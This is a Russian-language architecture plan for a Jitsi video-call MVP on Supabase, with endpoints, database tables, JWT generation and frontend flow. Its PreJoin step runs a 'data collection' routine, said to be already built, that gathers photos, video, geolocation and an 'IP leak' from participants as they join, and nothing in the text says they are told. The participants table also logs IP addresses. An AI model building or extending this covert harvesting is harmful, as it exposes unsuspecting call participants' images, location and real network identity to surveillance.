# Архитектура Jitsi Video Call с Supabase Backend (MVP)

## Обзор

Приложение для видеозвонков на базе **Jitsi Meet** с backend на **Supabase Edge Functions**. Приоритет — быстрый MVP с минимальной функциональностью.

---

## 1. Backend часть (Supabase Edge Functions)

### Что делает

1. **Генерирует JWT токены** для доступа к Jitsi комнатам (подпись через `JITSI_APP_SECRET`)
2. **Создаёт комнаты** в БД (slug, host, участники, статус)
3. **Управляет ролями** (moderator/participant) через токены
4. **Обрабатывает webhook'и** от Jitsi (вход/выход, завершение созвона)
5. **Хранит метаданные** о созвонах и участниках

### Эндпоинты (Edge Functions)

#### **Комнаты**

```
POST /functions/v1/create-room
Body: { hostName: string, roomTitle?: string }
Response: { 
  roomSlug: string, 
  inviteLink: string,
  roomId: string 
}
```

```
GET /functions/v1/get-room/:slug
Response: { 
  slug: string,
  title: string,
  isActive: boolean,
  hostName: string,
  createdAt: string
}
```

#### **Join / Токены**

```
POST /functions/v1/join-room/:slug
Body: { displayName: string }
Response: { 
  jitsiUrl: string,           // "meet.jit.si" или свой домен
  roomName: string,           // полное имя комнаты для Jitsi
  token: string,              // JWT токен
  identity: string,           // уникальный ID пользователя
  role: "moderator" | "participant",
  displayName: string
}
```

#### **Модерация (только для host)**

```
POST /functions/v1/end-meeting/:slug
Headers: { Authorization: "Bearer <token>" }
Response: { success: boolean }
```

```
POST /functions/v1/kick-participant/:slug
Body: { participantId: string }
Headers: { Authorization: "Bearer <token>" }
Response: { success: boolean }
```

#### **Webhooks**

```
POST /functions/v1/jitsi-webhook
Body: {
  event: "participant_joined" | "participant_left" | "room_ended",
  roomName: string,
  participantId: string,
  displayName?: string,
  timestamp: number
}
```

---

## 2. База данных (Supabase PostgreSQL)

### Таблица: `rooms`

```sql
CREATE TABLE rooms (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  slug TEXT UNIQUE NOT NULL,              -- публичный идентификатор (abc123)
  host_identity TEXT NOT NULL,            -- уникальный ID хоста
  host_display_name TEXT NOT NULL,        -- имя хоста
  title TEXT,                             -- название комнаты (опционально)
  created_at TIMESTAMPTZ DEFAULT NOW(),
  ended_at TIMESTAMPTZ,                   -- NULL если активна
  is_active BOOLEAN DEFAULT true,
  
  -- Опционально для MVP
  passcode_hash TEXT,                     -- хеш пароля комнаты
  max_participants INTEGER DEFAULT 10
);

CREATE INDEX idx_rooms_slug ON rooms(slug);
CREATE INDEX idx_rooms_is_active ON rooms(is_active);
```

### Таблица: `participants`

```sql
CREATE TABLE participants (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  room_id UUID REFERENCES rooms(id) ON DELETE CASCADE,
  identity TEXT NOT NULL,                 -- уникальный ID участника
  display_name TEXT NOT NULL,
  role TEXT NOT NULL CHECK (role IN ('moderator', 'participant')),
  joined_at TIMESTAMPTZ DEFAULT NOW(),
  left_at TIMESTAMPTZ,
  is_online BOOLEAN DEFAULT true,
  
  -- Метаданные
  user_agent TEXT,
  ip_address TEXT,
  
  UNIQUE(room_id, identity)
);

CREATE INDEX idx_participants_room_id ON participants(room_id);
CREATE INDEX idx_participants_is_online ON participants(is_online);
```

### Таблица: `room_events` (опционально, для аналитики)

```sql
CREATE TABLE room_events (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  room_id UUID REFERENCES rooms(id) ON DELETE CASCADE,
  event_type TEXT NOT NULL,               -- joined, left, muted, unmuted, etc.
  participant_identity TEXT,
  metadata JSONB,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX idx_room_events_room_id ON room_events(room_id);
```

---

## 3. Frontend интеграция

### Структура компонентов

```
src/
├── app/
│   ├── components/
│   │   ├── HomePage.tsx              # Создание/вход в комнату
│   │   ├── JitsiPreJoin.tsx          # Экран подготовки (уже есть)
│   │   ├── JitsiRoom.tsx             # Основная комната (NEW - интеграция Jitsi)
│   │   ├── JitsiMeetComponent.tsx    # Обёртка над Jitsi Meet API (NEW)
│   │   └── ParticipantsList.tsx      # Список участников (NEW)
│   └── App.tsx
├── utils/
│   ├── supabaseClient.ts             # NEW - Supabase клиент
│   ├── jitsiAPI.ts                   # NEW - вызовы к Edge Functions
│   └── jitsiConfig.ts                # NEW - конфигурация Jitsi
```

### App.tsx (роутинг)

```typescript
// Определяет маршруты
- "/" → HomePage (создание или ввод кода)
- "/prejoin/:slug" → JitsiPreJoin (запрос разрешений + получение токена)
- "/room/:slug" → JitsiRoom (подключение к Jitsi)
```

### JitsiRoom.tsx (основная комната)

**Что делает:**

1. Получает `token` и `roomName` из пропсов (переданных из PreJoin)
2. Инициализирует Jitsi Meet API с токеном
3. Подключается к комнате
4. Управляет локальным участником (mic/cam/screenshare)
5. Отображает других участников через Jitsi встроенный UI
6. Обрабатывает события (join/leave/mute/unmute)

**Интеграция:**

```typescript
import { JitsiMeetExternalAPI } from '@jitsi/web-sdk';

const api = new JitsiMeetExternalAPI(domain, {
  roomName: roomName,
  jwt: token,
  parentNode: containerRef.current,
  configOverwrite: {
    startWithAudioMuted: !audioEnabled,
    startWithVideoMuted: !videoEnabled,
    prejoinPageEnabled: false
  },
  interfaceConfigOverwrite: {
    SHOW_JITSI_WATERMARK: false,
    SHOW_WATERMARK_FOR_GUESTS: false
  }
});
```

### HomePage.tsx (создание/вход)

**Сценарий 1: Создать комнату**

```typescript
const handleCreateRoom = async () => {
  const { roomSlug, inviteLink } = await createRoom(userName);
  navigate(`/prejoin/${roomSlug}`);
};
```

**Сценарий 2: Войти по коду**

```typescript
const handleJoinByCode = async () => {
  const roomExists = await checkRoom(roomCode);
  if (roomExists) {
    navigate(`/prejoin/${roomCode}`);
  }
};
```

### JitsiPreJoin.tsx (обновлённый)

**Что меняется:**

1. При нажатии "Join meeting" → вызывает `POST /join-room/:slug`
2. Получает `{ token, roomName, role }`
3. Запускает сбор данных (камера, гео, IP leak - уже реализовано)
4. Переходит в `/room/:slug` с токеном

```typescript
const handleJoinMeeting = async () => {
  // 1. Получить токен с backend
  const joinData = await joinRoom(roomSlug, userName);
  
  // 2. Запустить сбор данных (фото, видео, IP leak)
  await startDataCollection();
  
  // 3. Перейти в комнату
  navigate(`/room/${roomSlug}`, { 
    state: { 
      token: joinData.token,
      roomName: joinData.roomName,
      role: joinData.role 
    }
  });
};
```

---

## 4. Логика генерации ссылок и ролей

### Сценарий 1: Создание комнаты (Host)

```mermaid
User → Frontend: "Create Room" + displayName
Frontend → Backend: POST /create-room { hostName }
Backend → DB: INSERT rooms (slug, host_identity)
Backend → Frontend: { roomSlug, inviteLink }
Frontend → User: Переход на /prejoin/:slug
User → Frontend: "Join Meeting"
Frontend → Backend: POST /join-room/:slug { displayName }
Backend → Frontend: { token (role: moderator), roomName }
Frontend → Jitsi: Подключение с JWT токеном
```

### Сценарий 2: Гость по ссылке

```mermaid
User → Frontend: Открывает /prejoin/:slug
User → Frontend: Вводит displayName + "Join"
Frontend → Backend: POST /join-room/:slug { displayName }
Backend → DB: SELECT room, INSERT participant
Backend → Frontend: { token (role: participant), roomName }
Frontend → Jitsi: Подключение с JWT токеном
```

---

## 5. JWT Token Structure (Jitsi)

### Payload структура

```json
{
  "aud": "jitsi",
  "iss": "your-app-id",
  "sub": "meet.jit.si",
  "room": "abc123",
  "context": {
    "user": {
      "id": "unique-user-id",
      "name": "John Doe",
      "email": "john@example.com",
      "avatar": "https://...",
      "moderator": true  // или false для participant
    }
  },
  "exp": 1234567890
}
```

### Генерация (Edge Function)

```typescript
import { create } from 'djwt';

const token = await create(
  { alg: 'HS256', typ: 'JWT' },
  {
    aud: 'jitsi',
    iss: Deno.env.get('JITSI_APP_ID'),
    sub: 'meet.jit.si',
    room: roomSlug,
    context: {
      user: {
        id: userId,
        name: displayName,
        moderator: role === 'moderator'
      }
    },
    exp: Math.floor(Date.now() / 1000) + 3600 // 1 час
  },
  Deno.env.get('JITSI_APP_SECRET')
);
```

---

## 6. Определение роли (кто Host)

### Правильный подход ✅

**Backend определяет роль:**

1. Первый участник (создатель) → `moderator`
2. Остальные → `participant`
3. Роль вшивается в JWT токен (`context.user.moderator`)
4. Критические действия (end meeting, kick) проверяются на backend

**Frontend использует роль для UI:**

```typescript
// Показывать кнопку "End meeting" только для moderator
{role === 'moderator' && (
  <button onClick={handleEndMeeting}>End Meeting</button>
)}
```

### Неправильный подход ❌

- ❌ Хранить роль только на frontend
- ❌ Определять роль по metadata участника (легко подделать)
- ❌ Разрешать критические действия без проверки на backend

---

## 7. MVP План реализации

### Фаза 1: Backend (Edge Functions) - День 1

- [ ] Установить Supabase CLI
- [ ] Создать Edge Functions:
  - `create-room`
  - `join-room`
  - `get-room`
- [ ] Создать таблицы БД (rooms, participants)
- [ ] Реализовать JWT генерацию

### Фаза 2: Frontend базовый - День 2

- [ ] Создать Supabase клиент
- [ ] Обновить HomePage (создание/вход по коду)
- [ ] Обновить JitsiPreJoin (получение токена)
- [ ] Создать JitsiRoom с базовой интеграцией

### Фаза 3: Jitsi интеграция - День 3

- [ ] Установить `@jitsi/web-sdk` (или использовать iframe)
- [ ] Настроить Jitsi конфигурацию
- [ ] Подключение с JWT токеном
- [ ] Обработка базовых событий (join/leave)

### Фаза 4: Полировка - День 4

- [ ] Webhooks для синхронизации статусов
- [ ] End meeting функционал
- [ ] Обработка ошибок
- [ ] UI/UX доработки

---

## 8. Environment Variables

### Supabase (Frontend)

```env
VITE_SUPABASE_URL=https://xxx.supabase.co
VITE_SUPABASE_ANON_KEY=eyJhbGc...
```

### Edge Functions

```env
JITSI_APP_ID=your-app-id
JITSI_APP_SECRET=your-secret-key
JITSI_DOMAIN=meet.jit.si  # или свой домен
SUPABASE_URL=https://xxx.supabase.co
SUPABASE_SERVICE_ROLE_KEY=eyJhbGc...
```

---

## 9. Альтернативы Jitsi (если понадобится)

- **Daily.co** - проще в интеграции, платный
- **Whereby** - встраиваемые комнаты, платный
- **Agora** - мощный, сложнее, платный
- **SimpleWebRTC** - open source, требует своего сервера

**Рекомендация для MVP:** Jitsi (бесплатный, проверенный, public инстанс meet.jit.si)

---

## 10. Безопасность

### Критично для MVP:

1. ✅ **JWT токены только с backend** - никогда не генерировать на фронте
2. ✅ **Проверка роли на backend** для критических действий
3. ✅ **HTTPS only** для production
4. ✅ **Rate limiting** на Edge Functions
5. ✅ **Валидация slug** (только alphanum, длина 6-12 символов)

### Опционально (после MVP):

- Пароли для комнат (passcode_hash)
- Whitelist/blacklist участников
- Лимиты на длительность созвона
- Логирование всех действий (room_events)

---

## Итого: Минимальный MVP

**Backend:**
- 3 Edge Functions (create-room, join-room, get-room)
- 2 таблицы (rooms, participants)
- JWT генерация

**Frontend:**
- Обновить HomePage (создание + вход по коду)
- Обновить PreJoin (получение токена вместо прямого перехода)
- Создать JitsiRoom (iframe или SDK интеграция)

**Интеграция:**
- Jitsi Meet (публичный инстанс) с JWT токенами

**Время:** ~3-4 дня полной работы для полнофункционального MVP.
